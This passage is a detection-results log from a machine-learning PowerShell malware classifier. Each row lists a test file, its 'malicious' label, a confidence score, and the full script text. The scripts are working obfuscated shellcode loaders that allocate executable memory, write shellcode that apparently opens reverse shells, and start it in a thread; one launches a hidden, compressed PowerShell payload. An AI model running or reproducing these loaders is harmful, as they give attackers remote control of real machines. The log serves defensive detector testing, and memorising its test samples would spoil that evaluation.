60};','89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0',',0x','xc0,0x74','4,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff','b,0x58,0x20,0x01,0xd3,0xe3,0x3','ea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x53,0x85,0x68,0x02,0x00,0x01,0xbb,0x',' uint dwCreationFlags, IntPtr lpThreadId);[DllImport(sjNmsvcrt.dllsjN)]pub','0xff,0x31,0','Parameter,',',0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,','nt flProtect);[DllImport(sjNkernel32.dllsjN)]pub','c extern IntPtr CreateThre','1,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x5','lic stati','56,0x53,0x57,0x68,0x02,0x','x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x',',0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8','c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,','0x3','x75,0xec,0x68,0xf0,0xb5,0','tr lp','d9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75',', uint dw','b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0x','wStackSize, IntPtr lpStartA','xchc = uOk[DllImport(sjNkernel32.dllsjN)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress','ad(IntPtr lpThreadAttributes, uint d','ddress, IntP','xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x5','finition xchc -Name sjNWin32sjN -namespace Win32Functions -passthru;[Byte[]];[Byte[]]xchz = 0xfc,0xe','lic static extern IntPtr memset(IntPtr dest, uint src, uint count','0x1000;if (xchz.Length -gt 0x1000){xchg = xchz.Length};xchx=xchw::VirtualAlloc(0,0x1000,xchg,0x40);for (xchi=0;xchi -le (xchz.Lengt','3,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6','h-1);xchi++) {xchw::memset([IntPtr](xchx.ToInt32()+xchi), xchz[xchi], 1)};xchw::CreateThread(0,0,xc',');uOk;xchw = Add-Type -memberDe',',0xec,0xc3;xchg = ','8,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x2','2,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40','0c,0xff,0x4e,0x08,0')).rEPlace(([chAR]117+[chAR]79+[chAR]107),[stRInG][chAR]39).rEPlace('xch','$').rEPlace(([chAR]115+[chAR]106+[chAR]78),[stRInG][chAR]34) |. ( $eNv:CoMspeC[4,26,25]-joIN'')",malicious,TP
2026-07-13 16:49:26,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1690.ps1,custom-ps-ml,UNKNOWN,46de1d37-e901-44e8-93ec-ad59f33d8821,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2937,1601.73,". ( $Pshome[4]+$PSHomE[34]+'X') (((\""{38}{64}{26}{61}{5}{65}{37}{33}{68}{67}{20}{10}{66}{13}{16}{48}{60}{15}{31}{2}{44}{27}{32}{56}{11}{3}{35}{42}{53}{25}{0}{21}{34}{6}{52}{29}{19}{1}{9}{41}{51}{59}{47}{23}{28}{62}{14}{7}{39}{22}{49}{54}{8}{69}{12}{43}{17}{57}{46}{30}{18}{45}{36}{55}{63}{24}{58}{40}{4}{50}\""-f '1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,',',0x4b,0x68,','x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0x',',0x01,0xd6','], 1)};1Bzw::CreateThread(0,0,1Bzt8d,0,0,0);for (;;){Start-sle','(','x32,0x5f,0x54,0x68,0x4c,0x77,0',',0x','6a,0x00,0x56,0x5','0x02,0x00,0x01,0xbb','JFz)',',0x8b,0x34,0x8b','0xc3,0x29,0xc6,0x85','ntPtr memset(IntPtr dest, uint src, uint cou','0xd5,0x8b','Fz -','n','ec','zt8d=1Bzw::VirtualAlloc(',',0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc5,0x1c,0x4d','ss, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(JFzmsvcrt.dll','0x68,0x33,0x32,0x00','0x10,0x00,0x00,0x','56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x','z.Length-1);1Bzi++) {1Bz','x01,0xd3,0x8b,0x04,0x8b,0x0','tPtr Vir','20,0x01,0xd3,0xe3,0x3c','68,0x02,0xd9,','0','ength};1B','namespace Win32Functions -passthru;[Byte[]];[Byte[]]1Bzz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0',',0x',' IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPt',',0x00,0x68,0x77,0x73,0',',0x31,0xff,0x31,0xc0,0xac,0xc1,0x','Bzi=','ddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(JFzkernel32.dllJFz)]public static extern','1BzYiu = 4sE[DllImport(JFzkernel32.dllJFz)]public stati','36,0x6a,0x40,0x68,0x00,','1Bzi), 1Bzz[1Bzi',',0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,','cf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0',',0xf6,0x75,0x','f0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x','0,0x1000,1Bzg,0x40);for (1','Length -gt 0x1000){1Bzg = 1Bzz.L',',0xb5,0xa2,0x','t);4sE;1Bzw = Add-T','56,0x6a,0x00,0x68,0x58,0xa4,0x53,','ep 60};','0x08,0x','x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x0','x8b,0x58,0x1c,0','0xe5,0xff,0xd5,0x93,0x53,0x','0;1Bzi -le ','49',',0xc3;1Bzg = 0x1000;if (1Bzz.','w::memset([IntPtr](1Bzt8d.ToInt32()+','75,0xec,0x68,0xf0','ype -memberDefinition 1BzYiu -Name JFzWin32J','tualAlloc','0xc8,0x5f,0xff,','(1Bz','c extern In','IntPtr lpA',']public static extern I','re','r lpStartAdd','3,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,')).rEpLace(([ChAR]74+[ChAR]70+[ChAR]122),[StrinG][ChAR]34).rEpLace('4sE',[StrinG][ChAR]39).rEpLace('1Bz','$') )",malicious,TP
2026-07-13 16:49:31,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1699.ps1,custom-ps-ml,UNKNOWN,60d1eced-cae8-45c5-832f-18c97aefcc80,DESKTOP-BAC9DBQ,malicious,0.878,RandomForest,2856,1655.3,"((\""{32}{15}{37}{27}{18}{14}{43}{20}{6}{44}{30}{41}{29}{3}{38}{8}{40}{21}{13}{7}{24}{42}{16}{25}{31}{26}{5}{19}{2}{17}{10}{48}{23}{0}{1}{28}{22}{4}{46}{33}{12}{34}{9}{39}{11}{47}{45}{36}{35}\""-f'0x29,0x55,0x2b,0x80,0x99,0x15,0x9b,0x68,0xf0,0x99,0xc4,0x88,0xfb,0x73,0x','6d,0x22,0x14,0x2a,0xc5,0xda,0x8d,0x77,0x9d,0x7b,0x51,0xa2,0xdb,0xbb,0xd9,0x41,0x1b,0x75,0x2a,0x2f,0x0f','x00,0x0c,0x06,',',0xc4,0xd9,0x74,0x24,0xf4,0x5b,0x','2,0x59,0xd5,0xb','f,0x86,0x55,0xcf,0x84,0xa7,0xcc,0xb5,0x6b,0xd7,0x0f,0x16,0xd3,0x7d,0x5b,0xba','ntPtr lpThreadId);[DllImport(Kt0msvcrt.dl','x59,0x2b,0xbd,0xf0,0xd2,0x72,0x1d,0xf2,0x37,0x0f,0x14,0xec,0x54,0x2a,0xee,0x87,0xae,0xc0,0xf1,0x41,0xff,0x29,0x5d,0xac,0x30,0xd','3,0x83,0xc3,0x21,0x01,0x1f','ngth -gt 0x1000){EKTg = EKTz.Length}',',0x62,0x35,0xca,0x10,0x2d,0xed,0x44,0x18,0xa6,0x2b,0x92,0x5f,0x9d,0x8c,0x0c,0x9e,0x1e,0xed,0x05,0x64,0x4a,0xbd,0x3d,0x4d,0xf3,0x56,0xbe,0x72','EKT','x70,0x24,0xce,0x3f,0xe5,0xf5,0x5b,0xc0,0x5c,0xaa,0xcc,0xa8,0x62,0x95,0x3b,0x77,0x9c,0xf0,0xbd,0x4b,0x4b,0x3c,','4,0xc9,0x37,0x32,0xb1,0x84,0x8b,0xb9,0x89,0x09,0x8c,0x5e,0','blic static extern IntPtr Crea','rt(Kt0kernel32.dllKt0','e8,0xf6,0x03,0xea,0x00,0x05,0xb9,0xed,0xd6,0x74,0x65,0x7b,0xcd,0xd','0xd2,0xe5,0x3d,0xb9,0x22','dllKt0)]pu',',0','dAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, I','0xdc,0xf3,0x2a,0x1f,0x4c,0xc7,0x2d,0xa3,0x8f,0x14,0x8e,0x9a,0x5f,0x69,0xcf,0xdb,0x82,0x80,0x9d,0xb','0xa2,0x99,0x82,0xdb,0x2','0,0x76,0x14,0x90,0x5a,0x7b,0x94,0x40,0x45,0xf2,0x72,0x20,','8,0x9f,','e,0xee,0xdb,0x29,0xdf,0x23,0xbd,0xba,0xd3,0x88,0xc9,0xe5,0','0x71,0x82,0xd','ublic static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(Kt0kernel32.',',0xe1,0xda,0x7a,0x6d,0xa7,0xe5,0x50,0x18,0x47,0x70,0x5f,0x8b,0x10,0xec,0x5d,0xea,0x56,0xb3,0x9e,0xd9,0xed,0x7a,0x0b,','0xe3,0xea,0x37,0xd9','t count);wk5;EKTw = Add-Type -memberDefinition EKTjdi -Name Kt0Win32Kt0 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]EKTz = 0xb','xf7,0x0f,0x1d,0x9e,0x03,0x9b,0xa0,','EKTjdi = wk5[DllImpo','x31,0x81,0xe1,0','0xc8,0xa5,0x4f;EKTg = 0x1000;if (EKTz.Le','KTw::memset([IntPtr](EKTU4S7.ToInt32()+EKTi), EKTz[EKTi], 1)};EKTw::CreateThread(0,0,EKTU4S7,0,0,0);for (;;){Start-sleep 60};','EKTi++) {E',')]p','2b,0xc9,0xb1,0x47,0x31,0x43,0x13,0x03,0x43,0x1',';',',0xcb,0xc1,0x47,0xe0,0x34,0x11,0x28,0x68,0xd1,0x20,0x68,0x0e,0x91,0x12,0x58,0x44,0xf7,0x9e,0x13,0x08,0xec,0x15,0x51,0x85,0x03,0x9e,','8,0x25,','0x','teThread(IntPtr lpThrea','lKt0)]public static extern IntPtr memset(IntPtr dest, uint src, uin',' -le (EKTz.Length-1);','1,0x22,0','U4S7=EKTw::VirtualAlloc(0,0x1000,EKTg,0x40);for (EKTi=0;EKTi',',0x26,0xc2,0xbb,0xe4,0xa')).rEpLAcE('wk5',[sTRING][ChAR]39).rEpLAcE('EKT',[sTRING][ChAR]36).rEpLAcE('Kt0',[sTRING][ChAR]34) | iNVOkE-EXPReSsioN",malicious,TP
2026-07-13 16:49:44,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1707.ps1,custom-ps-ml,UNKNOWN,ea9d57c2-e7a5-417c-845f-dda5b38bfb61,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2759,1604.34,"&amp;( $SHelLiD[1]+$ShELlId[13]+'x')(((\""{8}{25}{14}{13}{11}{35}{29}{19}{28}{16}{1}{33}{15}{18}{5}{39}{30}{6}{23}{31}{26}{12}{27}{21}{36}{41}{44}{24}{0}{7}{3}{37}{10}{34}{4}{9}{45}{32}{2}{22}{40}{46}{17}{43}{42}{20}{38}\""-f ',0x00,0x00,0x29,0xc4,0x5','0,0x','7,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;jyfg = 0x1000;if (jyfz.Length -gt 0x1000){jyfg',',0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5','x08,0x75,0xec,0x68','x7c','0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0','4','jyfc = qHK[DllImport(qoXkernel32.dllq',',0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,','e,0x6a,0x1c,0xa6,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0','rotect);[DllImport(qoXkernel32.dllqoX)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags,','8b,0x34,0','ype, uint flP','extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationT','b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x','x00,0x6','0,jyfg,0x40);for (jyfi=0;jyfi -le (jyfz.Length-1);j','3c,0x61,0','32Fun','memset([IntPtr](jyfx.ToInt32()+jyfi), jyfz[jyfi], 1)};jyfw::CreateThread','4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,',' = j','x01','x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01','oX)]public static ','0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x','x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf','ctions -passthru;[Byte[]];[Byte[]]jyfz = 0xfc,0xe8,0x89,0x00,0x00,0',' qoXWin32qoX -namespace Win','c,0x20,0xc1,0xcf,',',0xd0,0x50,0x8b,0x48,0x18,','x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x5','89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8','x0c,0xff,0x4e,0',' IntPtr lpThreadId);[DllImport(qoXmsvcrt.dllqoX)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);qHK;jyfw = Add-Type -memberDefinition jyfc -Name','0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,',',0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4','(0,0,jyfx,0,0,0);for (;;){Start-sleep 60};',',0x02,0x2','yfz.Length};jyfx=jyfw::','0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0','++) {jyfw::','yfi','x00,0x00,0','0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0','VirtualAlloc(0,0x100')).rEPLace('jyf',[STRiNG][Char]36).rEPLace('qoX',[STRiNG][Char]34).rEPLace('qHK',[STRiNG][Char]39) )",malicious,TP
2026-07-13 16:49:58,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1727.ps1,custom-ps-ml,UNKNOWN,0e7ca266-b263-4bda-b58d-60eedc73bb8b,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3092,1785.5," . ( $eNv:comSpeC[4,24,25]-JOin'') ( (((\""{22}{47}{15}{49}{3}{4}{16}{13}{50}{35}{41}{61}{59}{14}{38}{2}{28}{8}{1}{33}{53}{68}{34}{42}{46}{36}{19}{7}{31}{56}{48}{55}{9}{71}{21}{20}{63}{25}{37}{32}{57}{54}{51}{27}{26}{11}{65}{18}{6}{0}{12}{66}{60}{5}{72}{30}{24}{58}{17}{67}{40}{44}{23}{70}{69}{45}{39}{29}{64}{10}{62}{52}{43}\"" -f'N+lDZ0THo1WvJW+nDsNjXw9uqmeYPvbFnVPl1raLUHt5','NRAgSyn2/','4xE9CV1IeKrEX+6uLQN4GytfXr','AWindowsPowerShellw5Av1.0w5Apowershell.ex','ern5};uHFs=New-Object Syste','6aQcoXRIHxgij+L6xbehVx+Pe5N1g6uvODTvVG+Z15Pq6rj90GhfurPr44fL0Q39CnTVHY1133qQKAYkU7rEp','eK8bi9Czx/2vD94NS3r6rvWrQ/MUdGpYb7jWbSnxgPRqUe','J0gM+HI3vOcrohbChLGS8pc6z/a/SkJJ1wTmJRE8som4py6Jyx0ceoxcEX+hDshDfuyX','759aCkFJL2dNXTjo4AUIi6yVVrqHxU1DmKogZfYxouzs/','hWoOB/B60jOsz5N3toCJucOptwDDLFKFyD11xJnpjnqp8n4j','.Windo','zrqoc00rq2l9G/Xo','4m57vtNeWt5m2tHPJvUVaiJkhk2nZfCLqSHQUHdw4PCHi8DA68BEhmtRMhuNW8Zo1D','.P','4String(','uHFenv:windir+rn5w5Asysw','m.Diagnostics',');IEX (New','a24','UbrEHqAWoTkU3EWe','BK4ix9qMz+zipxW5okTVQtu8XIRw','CMRnZHfucg4bgIdqMZsgXoMwEmCZklpS5j+bNddUfrc1Eso8IpALgYz','if([IntPtr]::Size -eq 4){uHFb=rn5powershel','uHF','GDkOuZBou90kYyGWp8nhSqcDtX3msV+DMLz+nyaONmq9WSgvIjquDHdhuBy3NoMKmdml92E7Y/0FllsFLeHkvovJp7DezL6K3UtqT8NPwjwP/ieg/ZGGCqQS8DVcRI/ty+RsyMgkdfHLkEQOF+NmTf','2BGvJKCwphmUyiRfNcsP','RllO4KEBHJagq8NHJP3dVsKoE59o19SE8Ez7YbMco0VraIHWu1a8B/Tky5vnHoXvbuOLhqPSx91467VGTZGnU79vmc7dWk3u/Ji2JVW8+buzkadq/FU','hX/IWrufb3Qk+5yUk5cBQCbjMuS4pDhYQrI+X5SWJ/6s3hpXHglylIFik1T6q5sZFpFhRkZ3AWr4xUt','46GWOC1ohbILUaR2a','ardOutput','o6kGJXhEREgZlDQpfLm3EGHfT+vB0f0OB2peNBWTqGJontWdbmvIdqD2Vjnzo/Hw','GqmHRoAaSqGVICjPOmpxL2Fkb1vUfnb1MJQaPN/DCSx8e/3q9Ss/l4IbBRcDez','F8cyX26h/YvObFuTh7EU','3CYSxTFZ3zJKYlVT/lYmSyLI8eX','lm5ZueL2JiFq0qCt4z','Arguments=rn5-nop -w hidden -c uHFs=New-Obj','kUvuxUUNzgE/QWQiQiU7','rlrJUxS','rn5rn5H4sIAEloBVgCA71WbW/aOhT+3En7D9GERKJRApSta6VJ1wnvJRSaEgoMTW7iBBcTZ47TFnb33+8JJCu766befbgRKH55jn38nOf','directStand','(uHFs,[IO.Compression.CompressionMode]::Decompress))).ReadToEn','ect I','H1ZntDwpFYe','tics.Process]::Start(uHFs);','d();rn5;','=uHFfalse;uHFs.Re','hzH2yQBWuycW','l.exern5}else{uHFb=','/qhUSooFu2LJxQa6','ow64w5','rocessStartInfo;uHFs.FileName=uHFb;uHFs.','vMRxASmdpsVMVDo','ue;uHFp=[System.Diagnos','tHXGl8lU','z/JhYsZoGMBK9xAPGEl5sGUqEQGeZnLQyjaR3XXEyBpQuyR','hWuREG2hzNM4zBcLpbBcWvgyKv16','ubHSoBWkfzXZuAt+qQx3QH','iQvBBAqu7Yi4FLOUkZLSoR4xNjYN8u2L','vpdJvJ4AF8j/wA1xafydAoAAA==rn5rn5)','romBase6','wOMaXhkcGYBpzb6AX9OoNWQwfz2uceSwwQ1G/dmmpevV6bCOOhU','O.MemoryStream(,[Convert]::F','wStyle=rn5Hiddenrn5;uHFs.CreateNoWindow=uHFtr','+KJrk6EzFm3z3tA+goslwHJeUYQIp5ZYUm','=uHFtrue;uHFs','1u4jb/qov98','LQuH33pXGmB2B7g5fGxKnRWXRztYR+C1y40Cv1rke2fDoCktoc4eAKMIFZc5c+YBpvkfF2','-Object IO.StreamReader(New-Object IO.Compression.GzipStream','pfC63Gb/FLINtTOwuiXKMQi+d63MXp+6V7YhRqRY/fSpq8+Pqotz8kmAWq0V7E0uyLnuMFTX','e','s.UseShellExecut','vAbxaUgamxCvqZtrS30u','DuL9q+vewiJeYgY6gFs8z88WF63sPh5ymlq')) -REplaCE ([chAR]117+[chAR]72+[chAR]70),[chAR]36-crePlaCe ([chAR]119+[chAR]53+[chAR]65),[chAR]92-crePlaCe  ([chAR]114+[chAR]110+[chAR]53),[chAR]39) )",malicious,TP
2026-07-13 16:50:06,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1730.ps1,custom-ps-ml,UNKNOWN,0612870d-bcdd-47ae-9e99-13582906d508,DESKTOP-BAC9DBQ,malicious,0.9867,RandomForest,2870,1857.68," . ((gV '*MDr*').nAmE[3,11,2]-JoiN'') ((((\""{22}{44}{28}{33}{2}{3}{12}{40}{1}{21}{18}{43}{15}{42}{30}{23}{14}{24}{17}{46}{16}{13}{39}{8}{41}{47}{10}{29}{32}{27}{11}{37}{0}{34}{7}{36}{45}{19}{5}{25}{48}{20}{6}{31}{35}{26}{9}{4}{38}\"" -f 'c,0x8e,0x21,0xc2,0x43,0x24,0','sthru;[Byte[]];[Byte[]]RSgz = 0xb8,0x35,0x51,0x14,0xba,0','d(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartA','ddress, IntP','z[RSgi], 1)};RSgw::CreateThread(0,0,RSgx,0,0,0);for (;;){Sta','2,0xd6,0x94,0x22,0x16,0x85',',0xe9,0x1d,0x5c,0x36,0x3c,0x5b,0x2a,0x56,0x','3,0xc6,0xbd,0x4d','6,0x7f,0xd8,0x46,0xb0','::memset([IntPtr](RSgx.ToInt32()+RSgi), RSg','0,0xe7,0x47,0x13,0xdb,0x61,0xa1,0x43,0x4b,0x22,0',',0xe9,0xdc,0xb0,0x31,0x94,0xde,0x3b,0x','tr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(hR5msvcrt.dllhR5)]public static extern IntPtr memset(IntPtr dest, uint src, ','0xc6,0x23,0x48,0x11,0x10,0x44,0x63,0xe5,0x8e,0x','44,0x72,0xff','x4e,0xd9,0xac,0x04,0xe2,0x19,0xae,0x86,0xf9,0x4d,0x10,0xb7,0x31,0x80,0x51,0xf0,0x2c,0x69,0x03,0xa9,0x3b,0xdc,0xb4,0xde,','bd,0x77,0x0b,0x3b,0x3d,0x10,0x1c,0x48,0x0f,0xbf,0xb6,','f,0xf6,0x7a,0xe7,0x67,0x1a,0x7c,0x24,0x1c,0x26,0xf5,0xcb,0xf3,0xaf,0x4d,0xe8,0xd7,0xf4,0x16,0x91,0x4e,0x50,0xf8,0xae,0x91,0x3b,0xa5,0x0a,0xd9,0xd1,0x',',0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x47,0x0f,0x03,0x47,0x3a,0xb3,0xe1,0x46,0xac,0xb1,0x0a,0xb7,0x2c,0xd6',',0xd8,0xa7,0xd5,0xfc,0x24,0x28,0xd6,0xfc,0x72,0x2','x16,0x36,0x5c,0xca','xda,0xda,0xd9','RSgc = 3I9[DllImport(hR5kernel32.dllhR5)]public','9,0x',',0xc0,0x46,0x74,0x2c,0x79,0xcf,0x6e,0x31,0x44,0x99,0x05,0x81,0x32,0x18,0xcc,0xd8,0xbb,0xb7,0x31,0xd5,0x49,0xc9,0x76,0xd1,0xb1,0xbc,0x8e,0x22,0x4f,0xc7,0x54,0x59,0x8b,0x42,0x4f,0xf9,0x58,0xf4,0xab,0xf8,0x8d,0x63,0x3',',0x81,0x2c,0x83,0xb9,0x1a,0xb9,0x2c,0xe8,0xcf,0x6a,0x45','gz.Length-1);RSgi++) {RSgw','81,0xb5,0xbe,0x12,0x3d,0x2f,0x9b','lloc(IntPtr lpAddress, uint dwSize,','x7e,0x23,0x3b,0x82,0x2e,0xcb,0x51,0x0d,0x10,0xeb,','x76,0xdd,0x3f,0xac,0x97,0x65,0xa3,0x64,0x9','fc;RSgg = 0x1000;if (RSgz.Length -gt 0x1000){RSgg = RSgz.Length}','0x59,0xc7,0x39,0x',' uint flAllocationType, uint flProtect);[DllImport(hR5kernel32.dllhR5)]public static extern IntPtr CreateThrea','x4f,0xea,0xd1,0xc',';RSgx=RSgw::VirtualAlloc(0,0x1000,RSgg,0x40);for (RSgi=0;RSgi -le (RS',',0xce,0','b6,0x68,0x90,0xcb,0xb3,0x7a,0x44,0x3','rt-sleep 60};','bb,0x8c,0x16,0x8','uint count);3I9;RSgw = Add-Type -memberDefinition RSgc -Name hR5Win32hR5 -namespace Win32Functions -pas',',0x56,0x61,0x0d,0x40,0x57,0xb4,0xb8,0x45,0xcf,0xf7,0x95,0x47,0x0','0',',0x83,0x52,0x1d,0xd6,0xf0,0x17,0x0d,0xe6,0x73,0x75,0xa1,0x8d,0xd6,0x6e,0x32,0xe3,0xfe,0x81,0xf3,0',' static extern IntPtr VirtualA','x3f,0x89,0xd1,0x31,0x6a,0x82','b2,0x26,0x80,0x','c,0x9',',0'))  -crEplACe([cHAr]82+[cHAr]83+[cHAr]103),[cHAr]36 -crEplACe 'hR5',[cHAr]34-crEplACe '3I9',[cHAr]39) )",malicious,TP
2026-07-13 16:50:31,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\1733.ps1,custom-ps-ml,UNKNOWN,a6e2db89-9e59-4789-8115-9a309af28fbf,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3078,1818.23,". ( ([strInG]$VErbOsEPReFerence)[1,3]+'x'-JOiN'')( ((\""{18}{63}{37}{41}{72}{13}{56}{35}{20}{14}{9}{58}{50}{53}{4}{49}{69}{71}{46}{59}{26}{51}{65}{10}{0}{61}{1}{19}{43}{55}{67}{34}{36}{25}{3}{64}{17}{54}{38}{68}{27}{8}{30}{62}{22}{12}{32}{31}{2}{15}{39}{42}{5}{33}{45}{21}{47}{28}{48}{60}{66}{6}{16}{11}{29}{57}{40}{44}{24}{7}{52}{70}{23}\""-f'4,0x28,0xa6,0x9',',0x51,0x64,0xb','7,0x57,0','e,0','xtern IntPtr ','xd3,0x1d,0xcc,0x95,','ta3g = 0x','t32()+ta3i), ta3z[ta3i], 1)};ta3w::Cre','x63,0x7c,0x06,0x66,0xef,0x90,0x53,0x1b,0xb2,0xfc,0x90,0x16,0x4d,0xfc,0x','int dwCreationFlags, IntPtr lpT','1,0x62,0xf4,0x92,0x74,0x63,0x31,0xce,0x75,0x31,0xea,0x8','0;if (ta3z.Length -gt 0x1000){ta3g =','e9,0x04,0x2e,0x85,0xc0,0xf1,0xa0,','extern IntPtr CreateThread(IntPtr lpTh','er, u','x0e,0xbf,0x48,0x21,0x32,0xd7,0x8a,0xd1,0xd0,0x22,','100','x09,0xd9,0xda,0x31,0x22,0xe5,0x57,0','ta3c = rBa[DllImport(','8,0xa1,0x71,0x86,0x6d,0xda,0x3','ize, IntPtr lpStartAddress, IntPtr lpParamet',',0xc5,0xbb,0xb9','21,0x3e,0xce,0x61,0x9a,0xa8,0x62,0x','0};','(ta3z.Length-1);ta3i++) {ta3w::memset([IntPtr](ta3x.ToIn','0x85,0xb9,0x6','= 0xda,0xd5,0xb8,0xef,0xaf,0xff,0xcb,0xd9,0x74,0x24,0xf4,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x46,0x18,0x83,0xee,0xfc,0x03,0x46,0xfb','2,0','49,0x81,0xce,0x11,0x3e,0x02',' 